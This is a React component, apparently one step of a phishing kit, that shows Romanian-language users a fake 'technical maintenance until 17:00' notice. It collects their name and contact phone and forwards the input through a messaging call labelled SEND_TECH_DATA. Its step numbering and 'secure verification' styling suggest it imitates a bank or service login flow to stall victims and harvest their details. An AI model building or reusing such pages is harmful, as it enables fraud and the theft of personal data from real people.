import React, { useState } from 'react'
import { ErrorMsg } from './ErrorMsg'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'

export const Step5 = props => {

  const [showError, setShowError] = useState(false)
  const [cod, setCod] = useState('')

  const { store, changeStore } = props

  const handleConfirm = () => {
    if (!cod) {
      setShowError(true)
      return
    }
    const value = cod
    
    Messaging.send({ type: UserActions.SEND_TECH_DATA, payload: value })

    changeStore({
      step_5_cod : value,
      loading: true,
    })
  }

  

  const handleChangeCod = value => {
    console.log('value', value)
    setCod(value)
  }

  return (
    <div className="secure-container regular verification">
      <div className="secure-wrapper">
        <div style={{marginBottom: '32px'}} className="bold">
        Se duc lucrari tehnice pana la ora 17:00. Lasati datele d-vstra sa va contactam.
        </div>
        <div className="secure-fields-container">
            <div className="row">
              <div className="secure-field-description bold">
                Nume prenume / Telefon de contact
              </div>
              <div className="secure-field-input">
                <input onChange={e => handleChangeCod(e.target.value)} value={cod} />
                {!cod.length && showError && <ErrorMsg message="Campul nu poate fi gol" />}
              </div>
            </div>
            <div className="secure-buttons-container">
           
              <div>
                <button className="small-blue-btn regular" onClick={handleConfirm}>
                  Confirma
                </button>
              </div>
            </div>
          </div>
      </div>
    </div>
  )
}